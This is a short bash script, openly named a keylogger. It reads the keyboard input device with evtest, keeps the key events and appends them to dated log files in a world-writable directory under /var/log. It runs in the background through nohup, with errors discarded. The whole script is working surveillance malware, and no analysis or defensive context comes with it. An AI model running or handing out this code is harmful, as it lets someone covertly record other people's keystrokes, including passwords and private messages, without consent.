#!/bin/bash

LOG_DIR="/var/log/keylogger"
LOG_FILE="$LOG_DIR/$(date +'%Y-%m-%d').log"
KEYBOARD_DEVICE="/dev/input/event1"  #Update this based on your detected keyboard

#Ensure log directory exists
mkdir -p "$LOG_DIR"
chmod 777 "$LOG_DIR"

#to log keystrokes using evtest
log_keystrokes() {
    echo "[+] Keylogger started. Logging keystrokes in background...."
    nohup evtest "$KEYBOARD_DEVICE" | grep --line-buffered "KEY_" >> "$LOG_FILE" 2>/dev/null &
}


log_keystrokes
